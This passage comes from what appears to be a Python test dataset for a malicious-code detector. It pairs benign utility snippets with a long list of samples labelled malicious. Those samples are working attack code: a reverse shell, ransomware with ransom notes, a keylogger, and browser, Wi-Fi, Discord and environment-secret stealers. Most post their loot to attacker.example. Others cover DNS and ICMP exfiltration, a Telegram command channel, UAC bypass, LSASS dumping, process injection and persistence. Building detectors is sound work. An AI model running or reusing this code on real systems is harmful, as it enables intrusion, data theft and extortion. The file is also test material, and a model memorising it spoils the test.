hashes = hash_directory("/etc" if os.path.exists("/etc") else ".")
print(f"Hashed {len(hashes)} files")
""",
    ),
    TestCase(
        description="uuid namespace generation utility",
        expected="benign",
        code="""
import uuid
from typing import Union

def generate_ids(namespace: str, names: list[str]) -> list[dict]:
    ns_uuid = uuid.uuid5(uuid.NAMESPACE_DNS, namespace)
    return [
        {
            "name": name,
            "uuid_v4": str(uuid.uuid4()),
            "uuid_v5": str(uuid.uuid5(ns_uuid, name)),
        }
        for name in names
    ]

services = ["auth", "billing", "notifications", "search", "analytics"]
ids = generate_ids("myapp.services", services)

for entry in ids:
    print(f"{entry['name']:20s}  v4={entry['uuid_v4']}  v5={entry['uuid_v5']}")
""",
    ),
    TestCase(
        description="enum-based state machine",
        expected="benign",
        code="""
from enum import Enum, auto
from typing import Optional

class OrderState(Enum):
    PENDING   = auto()
    CONFIRMED = auto()
    SHIPPED   = auto()
    DELIVERED = auto()
    CANCELLED = auto()

TRANSITIONS: dict[OrderState, set[OrderState]] = {
    OrderState.PENDING:   {OrderState.CONFIRMED, OrderState.CANCELLED},
    OrderState.CONFIRMED: {OrderState.SHIPPED,   OrderState.CANCELLED},
    OrderState.SHIPPED:   {OrderState.DELIVERED},
    OrderState.DELIVERED: set(),
    OrderState.CANCELLED: set(),
}

class Order:
    def __init__(self, order_id: str) -> None:
        self.order_id = order_id
        self.state    = OrderState.PENDING

    def transition(self, new_state: OrderState) -> None:
        if new_state not in TRANSITIONS[self.state]:
            raise ValueError(f"Invalid transition: {self.state} → {new_state}")
        print(f"Order {self.order_id}: {self.state.name} → {new_state.name}")
        self.state = new_state

order = Order("ORD-001")
order.transition(OrderState.CONFIRMED)
order.transition(OrderState.SHIPPED)
order.transition(OrderState.DELIVERED)
""",
    ),
    TestCase(
        description="functools LRU cache with manual invalidation",
        expected="benign",
        code="""
import functools
import time

@functools.lru_cache(maxsize=128)
def expensive_computation(n: int) -> int:
    \"\"\"Simulate a slow pure function.\"\"\"
    time.sleep(0.001)
    return sum(i * i for i in range(n))

# Warm cache
results = [expensive_computation(i) for i in range(20)]
info = expensive_computation.cache_info()
print(f"Cache hits: {info.hits}  misses: {info.misses}  size: {info.currsize}")

# Invalidate
expensive_computation.cache_clear()
info = expensive_computation.cache_info()
print(f"After clear — hits: {info.hits}  misses: {info.misses}  size: {info.currsize}")
""",
    ),
    TestCase(
        description="itertools combinations and permutations",
        expected="benign",
        code="""
import itertools
from typing import Iterator

def password_complexity_check(charset: str, length: int) -> dict:
    combos  = sum(1 for _ in itertools.combinations(charset, length))
    perms   = sum(1 for _ in itertools.permutations(charset, length))
    product = sum(1 for _ in itertools.product(charset, repeat=length))
    return {"combinations": combos, "permutations": perms, "product_space": product}

DIGITS = "0123456789"
result = password_complexity_check(DIGITS, 4)
print(f"4-digit PIN space:")
print(f"  Combinations (no repeat): {result['combinations']}")
print(f"  Permutations (no repeat): {result['permutations']}")
print(f"  Full product space:       {result['product_space']}")
""",
    ),
    TestCase(
        description="Decimal precision arithmetic for finance",
        expected="benign",
        code="""
from decimal import Decimal, ROUND_HALF_UP, getcontext

getcontext().prec = 28

def compound_interest(principal: str, rate: str, periods: int) -> Decimal:
    p = Decimal(principal)
    r = Decimal(rate)
    return p * (1 + r) ** periods

def format_currency(amount: Decimal, currency: str = "USD") -> str:
    rounded = amount.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
    return f"{currency} {rounded:,}"

scenarios = [
    ("10000", "0.05",  1),
    ("10000", "0.05",  5),
    ("10000", "0.05", 10),
    ("10000", "0.05", 20),
]

print(f"{'Years':>5}  {'Final Value':>20}  {'Gain':>15}")
print("-" * 45)
for principal, rate, years in scenarios:
    result = compound_interest(principal, rate, years)
    gain   = result - Decimal(principal)
    print(f"{years:>5}  {format_currency(result):>20}  {format_currency(gain):>15}")
""",
    ),
    TestCase(
        description="datetime timezone conversion utility",
        expected="benign",
        code="""
from datetime import datetime, timezone, timedelta
from zoneinfo import ZoneInfo

def convert_timezone(dt: datetime, from_tz: str, to_tz: str) -> datetime:
    src = ZoneInfo(from_tz)
    dst = ZoneInfo(to_tz)
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=src)
    return dt.astimezone(dst)

def meeting_planner(utc_time: datetime, attendee_zones: list[str]) -> None:
    print(f"Meeting at {utc_time.strftime('%Y-%m-%d %H:%M')} UTC")
    print("-" * 40)
    for tz_name in attendee_zones:
        local = convert_timezone(utc_time, "UTC", tz_name)
        print(f"  {tz_name:<25} {local.strftime('%H:%M %Z (%a %d %b)')}")

meeting_time = datetime(2026, 3, 15, 14, 0, tzinfo=timezone.utc)
meeting_planner(meeting_time, ["Europe/Warsaw", "America/New_York", "Asia/Tokyo", "Australia/Sydney"])
""",
    ),
    TestCase(
        description="pathlib recursive file organizer",
        expected="benign",
        code="""
import pathlib
import shutil
from collections import defaultdict

EXTENSION_MAP = {
    ".jpg": "images", ".jpeg": "images", ".png": "images", ".gif": "images",
    ".pdf": "documents", ".docx": "documents", ".xlsx": "documents",
    ".py": "code", ".js": "code", ".ts": "code", ".go": "code",
    ".mp3": "audio", ".wav": "audio", ".flac": "audio",
}

def organize_directory(source: pathlib.Path, dest: pathlib.Path, dry_run: bool = True) -> dict:
    moved: dict[str, list] = defaultdict(list)
    for file in source.iterdir():
        if not file.is_file():
            continue
        category = EXTENSION_MAP.get(file.suffix.lower(), "misc")
        target_dir = dest / category
        target_file = target_dir / file.name
        if not dry_run:
            target_dir.mkdir(parents=True, exist_ok=True)
            shutil.move(str(file), str(target_file))
        moved[category].append(file.name)
    return dict(moved)

plan = organize_directory(pathlib.Path("."), pathlib.Path("./organized"), dry_run=True)
for category, files in sorted(plan.items()):
    print(f"  {category}: {len(files)} file(s)")
""",
    ),
    TestCase(
        description="abstract base class with registry pattern",
        expected="benign",
        code="""
from abc import ABC, abstractmethod
from typing import ClassVar

class Serializer(ABC):
    _registry: ClassVar[dict[str, type]] = {}

    def __init_subclass__(cls, format_name: str = "", **kwargs):
        super().__init_subclass__(**kwargs)
        if format_name:
            Serializer._registry[format_name] = cls

    @classmethod
    def for_format(cls, fmt: str) -> "Serializer":
        if fmt not in cls._registry:
            raise KeyError(f"No serializer for format: {fmt!r}")
        return cls._registry[fmt]()

    @abstractmethod
    def serialize(self, data: dict) -> str: ...

    @abstractmethod
    def deserialize(self, raw: str) -> dict: ...


class JSONSerializer(Serializer, format_name="json"):
    import json as _json
    def serialize(self, data):   return self._json.dumps(data)
    def deserialize(self, raw):  return self._json.loads(raw)


class TOMLSerializer(Serializer, format_name="toml"):
    def serialize(self, data):
        return "\n".join(f'{k} = "{v}"' for k, v in data.items())
    def deserialize(self, raw):
        return dict(line.split(" = ") for line in raw.strip().splitlines())


for fmt in ["json", "toml"]:
    s = Serializer.for_format(fmt)
    encoded = s.serialize({"host": "localhost", "port": "5432"})
    decoded = s.deserialize(encoded)
    print(f"[{fmt}] {decoded}")
""",
    ),
    TestCase(
        description="heapq priority queue task scheduler",
        expected="benign",
        code="""
import heapq
import time
from dataclasses import dataclass, field
from typing import Callable, Any

@dataclass(order=True)
class ScheduledTask:
    run_at: float
    priority: int
    func: Callable = field(compare=False)
    args: tuple = field(default_factory=tuple, compare=False)

class Scheduler:
    def __init__(self):
        self._heap: list[ScheduledTask] = []

    def schedule(self, delay: float, priority: int, func: Callable, *args):
        task = ScheduledTask(time.monotonic() + delay, priority, func, args)
        heapq.heappush(self._heap, task)

    def run_pending(self):
        now = time.monotonic()
        while self._heap and self._heap[0].run_at <= now:
            task = heapq.heappop(self._heap)
            task.func(*task.args)

def greet(name): print(f"Hello, {name}!")
def alert(msg):  print(f"ALERT: {msg}")

sched = Scheduler()
sched.schedule(0.01, 1, greet, "Alice")
sched.schedule(0.02, 0, alert, "Disk usage > 90%")
sched.schedule(0.03, 2, greet, "Bob")

time.sleep(0.05)
sched.run_pending()
""",
    ),
    TestCase(
        description="Markdown to HTML converter",
        expected="benign",
        code="""
import re

def md_to_html(md: str) -> str:
    lines = md.split("\\n")
    html_lines = []
    in_list = False
    for line in lines:
        if line.startswith("### "):
            html_lines.append(f"<h3>{line[4:]}</h3>")
        elif line.startswith("## "):
            html_lines.append(f"<h2>{line[3:]}</h2>")
        elif line.startswith("# "):
            html_lines.append(f"<h1>{line[2:]}</h1>")
        elif line.startswith("- "):
            if not in_list:
                html_lines.append("<ul>")
                in_list = True
            html_lines.append(f"  <li>{line[2:]}</li>")
        else:
            if in_list:
                html_lines.append("</ul>")
                in_list = False
            if line.strip():
                line = re.sub(r"\\*\\*(.*?)\\*\\*", r"<strong>\\1</strong>", line)
                line = re.sub(r"\\*(.*?)\\*", r"<em>\\1</em>", line)
                line = re.sub(r"`(.*?)`", r"<code>\\1</code>", line)
                html_lines.append(f"<p>{line}</p>")
    return "\\n".join(html_lines)

md = "# Title\\n\\nThis is **bold** and *italic*.\\n\\n- Item 1\\n- Item 2"
print(md_to_html(md))
""",
    ),
]


# --------------------------------------------------------------------------
# 30 plain malicious samples
# --------------------------------------------------------------------------

MALICIOUS_SAMPLES: list[TestCase] = [
    TestCase(
        description="reverse shell via socket + dup2",
        expected="malicious",
        code="""
import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

reverse_shell("192.168.0.100", 4444)
""",
    ),
    TestCase(
        description="base64-encoded exec payload",
        expected="malicious",
        code="""
import base64
import os

payload = base64.b64decode(
    "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoIHwgYmFzaCcp"
)
exec(compile(payload, "<string>", "exec"))
""",
    ),
    TestCase(
        description="keylogger with pynput + exfil",
        expected="malicious",
        code="""
from pynput import keyboard
import requests

_buf = []

def on_press(key):
    try:
        _buf.append(key.char)
    except AttributeError:
        _buf.append(str(key))
    if len(_buf) >= 50:
        requests.post("http://attacker.example/log", data={"keys": "".join(_buf)})
        _buf.clear()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
""",
    ),
    TestCase(
        description="ransomware file encryption loop",
        expected="malicious",
        code="""
import os
import glob
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY = get_random_bytes(16)

def encrypt_file(path):
    cipher = AES.new(KEY, AES.MODE_EAX)
    with open(path, "rb") as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(path + ".locked", "wb") as f:
        f.write(cipher.nonce + tag + ciphertext)
    os.remove(path)

for ext in ["*.docx", "*.xlsx", "*.pdf", "*.jpg", "*.png"]:
    for path in glob.glob(f"C:/Users/**/{ext}", recursive=True):
        encrypt_file(path)

with open("C:/Users/Public/Desktop/README.txt", "w") as f:
    f.write("Your files have been encrypted. Pay 0.5 BTC to recover them.")
""",
    ),
    TestCase(
        description="browser credential stealer via sqlite",
        expected="malicious",
        code="""
import os
import sqlite3
import shutil
import requests

CHROME_DB = os.path.expanduser(
    r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
)

def steal_credentials():
    tmp = "login_data_copy"
    shutil.copy(CHROME_DB, tmp)
    conn = sqlite3.connect(tmp)
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    creds = cur.fetchall()
    conn.close()
    os.remove(tmp)
    requests.post("http://attacker.example/creds", json={"data": str(creds)})

steal_credentials()
""",
    ),
    TestCase(
        description="port scanner with threading",
        expected="malicious",
        code="""
import socket
import threading

OPEN_PORTS = []

def scan_port(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((host, port)) == 0:
        OPEN_PORTS.append(port)
    s.close()

threads = []
for port in range(1, 1025):
    t = threading.Thread(target=scan_port, args=("192.168.1.1", port))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Open ports:", OPEN_PORTS)
""",
    ),
    TestCase(
        description="Windows registry persistence via winreg",
        expected="malicious",
        code="""
import winreg
import os
import shutil

PAYLOAD = os.path.abspath(__file__)
PERSIST_PATH = os.path.join(os.environ["APPDATA"], "svchost.exe")
shutil.copy(PAYLOAD, PERSIST_PATH)

key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,
    winreg.KEY_SET_VALUE,
)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, PERSIST_PATH)
winreg.CloseKey(key)
""",
    ),
    TestCase(
        description="Discord token harvester",
        expected="malicious",
        code="""
import os
import re
import requests

TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
PATHS = {
    "Discord": os.path.join(os.environ.get("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
}

def harvest_tokens():
    tokens = []
    for app, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for f in os.listdir(path):
            if not f.endswith((".log", ".ldb")):
                continue
            content = open(os.path.join(path, f), errors="ignore").read()
            tokens += re.findall(TOKEN_REGEX, content)
    return list(set(tokens))

webhook = "https://discord.com/api/webhooks/FAKE/FAKE"
tokens = harvest_tokens()
for tok in tokens:
    requests.post(webhook, json={"content": f"Token: {tok}"})
""",
    ),
    TestCase(
        description="subprocess shell injection",
        expected="malicious",
        code="""
import subprocess
import sys

user_input = sys.argv[1] if len(sys.argv) > 1 else "id"
result = subprocess.run(
    f"ping -c 1 {user_input}",
    shell=True,
    capture_output=True,
    text=True,
)
print(result.stdout)
""",
    ),
    TestCase(
        description="UAC bypass via fodhelper registry hijack",
        expected="malicious",
        code="""
import winreg
import subprocess

def uac_bypass(cmd):
    key_path = r"Software\\Classes\\ms-settings\\shell\\open\\command"
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.CloseKey(key)
    subprocess.run(["C:\\Windows\\System32\\fodhelper.exe"])
    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)

uac_bypass("C:\\Windows\\System32\\cmd.exe /c whoami > C:\\Users\\Public\\out.txt")
""",
    ),
    TestCase(
        description="WiFi password dumper via netsh",
        expected="malicious",
        code="""
import subprocess
import re
import requests

def dump_wifi_passwords():
    result = subprocess.run(
        ["netsh", "wlan", "show", "profiles"],
        capture_output=True, text=True
    )
    profiles = re.findall(r"All User Profile\s*:\s*(.+)", result.stdout)
    passwords = {}
    for profile in profiles:
        profile = profile.strip()
        detail = subprocess.run(
            ["netsh", "wlan", "show", "profile", profile, "key=clear"],
            capture_output=True, text=True
        )
        match = re.search(r"Key Content\s*:\s*(.+)", detail.stdout)
        if match:
            passwords[profile] = match.group(1).strip()
    return passwords

creds = dump_wifi_passwords()
requests.post("http://attacker.example/wifi", json=creds)
""",
    ),
    TestCase(
        description="clipboard stealer loop",
        expected="malicious",
        code="""
import time
import win32clipboard
import requests

PREV = ""

def steal_clipboard():
    global PREV
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data != PREV and data.strip():
                PREV = data
                requests.post("http://attacker.example/clip", data={"text": data})
        except Exception:
            pass
        time.sleep(1)

steal_clipboard()
""",
    ),
    TestCase(
        description="screenshot capture and exfiltration",
        expected="malicious",
        code="""
import time
import io
import requests
from PIL import ImageGrab

def exfil_screenshots(interval=30):
    while True:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        requests.post(
            "http://attacker.example/screens",
            files={"screenshot": ("screen.png", buf, "image/png")},
        )
        time.sleep(interval)

exfil_screenshots()
""",
    ),
    TestCase(
        description="fileless stager — urllib exec from URL",
        expected="malicious",
        code="""
import urllib.request

url = "http://attacker.example/stage2.py"
with urllib.request.urlopen(url) as resp:
    code = resp.read().decode()

exec(compile(code, url, "exec"), {"__name__": "__main__"})
""",
    ),
    TestCase(
        description="SSH brute force with paramiko",
        expected="malicious",
        code="""
import paramiko

TARGET = "192.168.1.50"
PORT = 22
USER = "root"
WORDLIST = ["password", "123456", "toor", "admin", "root", "qwerty"]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in WORDLIST:
    try:
        client.connect(TARGET, port=PORT, username=USER, password=password, timeout=3)
        print(f"[+] Found: {USER}:{password}")
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {password}")
    except Exception as e:
        print(f"[!] Error: {e}")
        break
""",
    ),
    TestCase(
        description="cryptominer dropper via subprocess",
        expected="malicious",
        code="""
import os
import urllib.request
import subprocess
import platform

MINER_URL = "http://attacker.example/xmrig"
POOL = "pool.minexmr.com:4444"
WALLET = "4ABCDEF1234567890ABCDEF"

def drop_and_run():
    dest = os.path.join(os.environ.get("TEMP", "/tmp"), "svchost")
    urllib.request.urlretrieve(MINER_URL, dest)
    os.chmod(dest, 0o755)
    subprocess.Popen(
        [dest, "-o", POOL, "-u", WALLET, "--background", "--donate-level=1"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
    )

drop_and_run()
""",
    ),
    TestCase(
        description="ctypes process injection (WriteProcessMemory)",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

SHELLCODE = bytearray(
    b"\\x90\\x90\\x90\\x90"  # NOP sled placeholder
    b"\\xcc"                 # INT3 breakpoint placeholder
)

kernel32 = ctypes.windll.kernel32

pid = int(input("Target PID: "))
handle = kernel32.OpenProcess(0x1F0FFF, False, pid)
addr = kernel32.VirtualAllocEx(handle, None, len(SHELLCODE), 0x3000, 0x40)
kernel32.WriteProcessMemory(handle, addr, SHELLCODE, len(SHELLCODE), None)
thread = kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
""",
    ),
    TestCase(
        description="scheduled task persistence (schtasks)",
        expected="malicious",
        code="""
import subprocess
import os
import shutil

PAYLOAD_SRC = __file__
PAYLOAD_DST = os.path.join(os.environ.get("APPDATA", ""), "update_helper.py")
shutil.copy(PAYLOAD_SRC, PAYLOAD_DST)

subprocess.run([
    "schtasks", "/create",
    "/tn", "WindowsUpdateHelper",
    "/tr", f"python {PAYLOAD_DST}",
    "/sc", "ONLOGON",
    "/rl", "HIGHEST",
    "/f",
], check=True)
""",
    ),
    TestCase(
        description="ARP spoofing with scapy",
        expected="malicious",
        code="""
import time
import scapy.all as scapy

def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    result = scapy.srp(broadcast / arp, timeout=1, verbose=False)[0]
    return result[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

gateway = "192.168.1.1"
victim   = "192.168.1.50"

while True:
    spoof(victim, gateway)
    spoof(gateway, victim)
    time.sleep(2)
""",
    ),
    TestCase(
        description="LSASS memory dump via ctypes",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

PROCESS_ALL_ACCESS = 0x1F0FFF
MiniDumpWithFullMemory = 0x00000002

dbghelp = ctypes.windll.dbghelp
kernel32 = ctypes.windll.kernel32

lsass_pid = int(input("LSASS PID: "))
handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)

with open("lsass.dmp", "wb") as f:
    dbghelp.MiniDumpWriteDump(
        handle,
        lsass_pid,
        f.fileno(),
        MiniDumpWithFullMemory,
        None, None, None,
    )

kernel32.CloseHandle(handle)
print("Dump saved to lsass.dmp")
""",
    ),
    # ---------- NEW MALICIOUS SAMPLES ----------
    TestCase(
        description="mmap fileless shellcode execution",
        expected="malicious",
        code="""
import mmap
import ctypes
import os

def run_shellcode(shellcode: bytes) -> None:
    mm = mmap.mmap(
        -1, len(shellcode),
        mmap.MAP_SHARED | mmap.MAP_ANONYMOUS,
        mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    )
    mm.write(shellcode)
    mm.seek(0)
    buf = (ctypes.c_char * len(shellcode)).from_buffer(mm)
    fn  = ctypes.cast(buf, ctypes.CFUNCTYPE(None))
    fn()

SHELLCODE = b"\\x90\\x90\\x90\\xcc"  # NOP + INT3 placeholder
run_shellcode(SHELLCODE)
""",
    ),
    TestCase(
        description="Telegram bot as C2 channel",
        expected="malicious",
        code="""
import os
import subprocess
import requests
import time

BOT_TOKEN  = "1234567890:AAFakeTokenForTestingPurposesOnly"
CHAT_ID    = "-1001234567890"
API_BASE   = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send(text: str) -> None:
    requests.post(f"{API_BASE}/sendMessage", json={"chat_id": CHAT_ID, "text": text})

def get_updates(offset: int = 0):
    r = requests.get(f"{API_BASE}/getUpdates", params={"offset": offset, "timeout": 30})
    return r.json().get("result", [])

def run_command(cmd: str) -> str:
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return out.decode(errors="replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="replace")

send(f"Bot online. Host: {os.uname().nodename}")
offset = 0
while True:
    for update in get_updates(offset):
        offset = update["update_id"] + 1
        text = update.get("message", {}).get("text", "")
        if text.startswith("/exec "):
            result = run_command(text[6:])
            send(result[:4096])
    time.sleep(1)
""",
    ),
    TestCase(
        description="DNS exfiltration via base64-encoded subdomains",
        expected="malicious",
        code="""
import os
import socket
import base64
import time

C2_DOMAIN = "exfil.attacker.example"

def exfil_via_dns(data: bytes, domain: str = C2_DOMAIN) -> None:
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    for chunk in chunks:
        label = base64.b32encode(chunk).decode().rstrip("=").lower()
        query = f"{label}.{domain}"
        try:
            socket.gethostbyname(query)
        except socket.gaierror:
            pass
        time.sleep(0.1)

hostname   = os.uname().nodename.encode()
username   = os.environ.get("USER", "unknown").encode()
secret_dir = os.listdir(os.path.expanduser("~"))
payload    = hostname + b"|" + username + b"|" + str(secret_dir).encode()
exfil_via_dns(payload)
""",
    ),
    TestCase(
        description="environment variable and secrets harvester",
        expected="malicious",
        code="""
import os
import re
import requests

SECRET_PATTERNS = [
    r"(?i)(password|passwd|secret|token|api[_-]?key|aws[_-]?secret|private[_-]?key)",
    r"(?i)(database[_-]?url|connection[_-]?string)",
    r"AKIA[0-9A-Z]{16}",          # AWS access key
    r"ghp_[0-9a-zA-Z]{36}",       # GitHub token
]

def harvest_env() -> dict:
    found = {}
    for key, value in os.environ.items():
        for pattern in SECRET_PATTERNS:
            if re.search(pattern, key) or re.search(pattern, value):
                found[key] = value
                break
    return found

secrets = harvest_env()
if secrets:
    requests.post(
        "http://attacker.example/secrets",
        json=secrets,
        timeout=5,
    )
""",
    ),
    TestCase(
        description="WMI persistence via win32com",
        expected="malicious",
        code="""
import win32com.client
import os

PAYLOAD_PATH = os.path.abspath(__file__)

def persist_via_wmi(payload: str) -> None:
    wmi = win32com.client.GetObject("winmgmts:")
    subscription_class = wmi.Get("__EventFilter")
    filter_instance = subscription_class.SpawnInstance_()
    filter_instance.Name = "WindowsHealthMonitor"
    filter_instance.QueryLanguage = "WQL"
    filter_instance.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"
    filter_instance.Put_()

    consumer_class = wmi.Get("CommandLineEventConsumer")
    consumer_instance = consumer_class.SpawnInstance_()
    consumer_instance.Name = "WindowsHealthMonitorConsumer"
    consumer_instance.CommandLineTemplate = f"python {payload}"
    consumer_instance.Put_()

persist_via_wmi(PAYLOAD_PATH)
print(f"WMI persistence set for {PAYLOAD_PATH}")
""",
    ),
    TestCase(
        description="living-off-the-land via certutil + bitsadmin",
        expected="malicious",
        code="""
import subprocess
import os
import tempfile

PAYLOAD_URL  = "http://attacker.example/payload.exe"
STAGE_PATH   = os.path.join(tempfile.gettempdir(), "msupdate.exe")

def download_with_certutil(url: str, dest: str) -> bool:
    result = subprocess.run(
        ["certutil", "-urlcache", "-split", "-f", url, dest],
        capture_output=True
    )
    return result.returncode == 0

def download_with_bitsadmin(url: str, dest: str) -> bool:
    subprocess.run([
        "bitsadmin", "/transfer", "WindowsUpdate",
        "/download", "/priority", "foreground",
        url, dest
    ], capture_output=True)
    return os.path.exists(dest)

if download_with_certutil(PAYLOAD_URL, STAGE_PATH) or download_with_bitsadmin(PAYLOAD_URL, STAGE_PATH):
    os.chmod(STAGE_PATH, 0o755)
    subprocess.Popen([STAGE_PATH], close_fds=True)
""",
    ),
    TestCase(
        description="clipboard crypto address hijacker",
        expected="malicious",
        code="""
import re
import time
import pyperclip

BTC_PATTERN  = re.compile(r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}")
ETH_PATTERN  = re.compile(r"0x[a-fA-F0-9]{40}")
MY_BTC_ADDR  = "1AttackerBitcoinAddressHereXXXXXX"
MY_ETH_ADDR  = "0xDeAdBeEfAttackerEthereumAddressHere"

def hijack_clipboard():
    prev = ""
    while True:
        try:
            current = pyperclip.paste()
            if current != prev:
                prev = current
                if BTC_PATTERN.fullmatch(current.strip()):
                    pyperclip.copy(MY_BTC_ADDR)
                elif ETH_PATTERN.fullmatch(current.strip()):
                    pyperclip.copy(MY_ETH_ADDR)
        except Exception:
            pass
        time.sleep(0.5)

hijack_clipboard()
""",
    ),
    TestCase(
        description="process hollowing stub via ctypes + CreateProcess",
        expected="malicious",
        code="""
import ctypes
import ctypes.wintypes

CREATE_SUSPENDED     = 0x00000004
PROCESS_ALL_ACCESS   = 0x1F0FFF
MEM_COMMIT_RESERVE   = 0x3000
PAGE_EXECUTE_RW      = 0x40

kernel32 = ctypes.windll.kernel32

startup_info  = ctypes.wintypes.STARTUPINFOW()
process_info  = ctypes.wintypes.PROCESS_INFORMATION()
startup_info.cb = ctypes.sizeof(startup_info)

kernel32.CreateProcessW(
    "C:\\\\Windows\\\\System32\\\\svchost.exe",
    None, None, None, False,
    CREATE_SUSPENDED, None, None,
    ctypes.byref(startup_info),
    ctypes.byref(process_info),
)

shellcode = b"\\x90" * 64 + b"\\xcc"
remote_mem = kernel32.VirtualAllocEx(
    process_info.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_RW
)
kernel32.WriteProcessMemory(
    process_info.hProcess, remote_mem, shellcode, len(shellcode), None
)
kernel32.ResumeThread(process_info.hThread)
""",
    ),
    TestCase(
        description="LDAP reconnaissance — Active Directory user enumeration",
        expected="malicious",
        code="""
import ldap3
import requests

SERVER   = "ldap://dc.corp.local"
BASE_DN  = "DC=corp,DC=local"
BIND_DN  = "CN=svc_account,OU=Service Accounts,DC=corp,DC=local"
PASSWORD = "SuperSecret123!"

server = ldap3.Server(SERVER, get_info=ldap3.ALL)
conn   = ldap3.Connection(server, BIND_DN, PASSWORD, auto_bind=True)

conn.search(
    BASE_DN,
    "(objectClass=person)",
    attributes=["sAMAccountName", "mail", "memberOf", "userAccountControl"],
)

users = []
for entry in conn.entries:
    users.append({
        "username": str(entry.sAMAccountName),
        "email":    str(entry.mail),
        "groups":   [str(g) for g in entry.memberOf],
    })

requests.post("http://attacker.example/ad_dump", json=users, timeout=10)
conn.unbind()
""",
    ),
    TestCase(
        description="Fernet ransomware with ransom note drop",
        expected="malicious",
        code="""
import os
from pathlib import Path
from cryptography.fernet import Fernet

KEY   = Fernet.generate_key()
fern  = Fernet(KEY)
EXTS  = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", ".db", ".sql"}
ROOT  = Path.home()

def encrypt_and_delete(path: Path) -> None:
    data = path.read_bytes()
    path.with_suffix(path.suffix + ".sc_enc").write_bytes(fern.encrypt(data))
    path.unlink()

for p in ROOT.rglob("*"):
    if p.is_file() and p.suffix.lower() in EXTS:
        try:
            encrypt_and_delete(p)
        except PermissionError:
            pass

ransom_note = ROOT / "Desktop" / "HOW_TO_RECOVER.txt"
ransom_note.write_text(
    f"All your files are encrypted.\\n"
    f"Send 1 BTC to 1FakeAddressHereXXXXXX\\n"
    f"Then email key@attacker.example with your ID.\\n"
    f"KEY_ID: {KEY.decode()[:16]}..."
)
""",
    ),
    # ---------- NEW MALICIOUS SAMPLES v3 ----------
    TestCase(
        description="RDP password spray via rdp3",
        expected="malicious",
        code="""
import itertools
import subprocess

TARGETS = ["192.168.1.10", "192.168.1.11", "192.168.1.12"]
USERNAMES = ["administrator", "admin", "user"]
PASSWORDS = ["Password1!", "Summer2024!", "Welcome123", "Admin@123"]

for host, user, password in itertools.product(TARGETS, USERNAMES, PASSWORDS):
    result = subprocess.run(
        ["xfreerdp", f"/v:{host}", f"/u:{user}", f"/p:{password}",
         "/cert-ignore", "+auth-only", "/timeout:3000"],
        capture_output=True,
        timeout=10,
    )
    if result.returncode == 0:
        print(f"[+] SUCCESS {host} {user}:{password}")
        with open("rdp_hits.txt", "a") as f:
            f.write(f"{host}\t{user}\t{password}\\n")
""",
    ),
    TestCase(
        description="ICMP covert channel exfiltration via scapy",
        expected="malicious",
        code="""
import base64
import os
import scapy.all as scapy

C2_HOST = "10.0.0.1"

def exfil_icmp(data: bytes, dst: str) -> None:
    encoded = base64.b64encode(data)
    chunks  = [encoded[i:i+28] for i in range(0, len(encoded), 28)]
    for i, chunk in enumerate(chunks):
        pkt = scapy.IP(dst=dst) / scapy.ICMP(id=0xdead, seq=i) / scapy.Raw(load=chunk)
        scapy.send(pkt, verbose=False)

